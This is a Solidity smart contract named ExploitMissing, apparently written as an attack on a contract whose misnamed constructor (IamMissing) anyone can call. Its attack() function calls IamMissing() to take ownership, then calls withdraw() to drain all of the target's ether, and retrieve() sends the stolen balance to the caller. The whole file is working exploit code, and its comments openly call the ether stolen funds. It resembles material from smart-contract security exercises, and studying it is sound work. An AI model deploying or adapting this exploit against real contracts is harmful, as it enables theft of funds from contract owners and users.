pragma solidity ^0.4.24;

interface IMissing {
    function IamMissing() external;
    function withdraw() external;
}

contract ExploitMissing {
    IMissing public vulnerable;

    constructor(address _target) public {
        vulnerable = IMissing(_target);
    }

    function attack() public {
        // Step 1: Become the owner
        vulnerable.IamMissing();

        // Step 2: Withdraw all ether
        vulnerable.withdraw();

        // Now this contract holds the stolen funds
    }

    // Helper to extract stolen funds
    function retrieve() public {
        msg.sender.transfer(address(this).balance);
    }

    // Accept ETH
    function () public payable {}
}

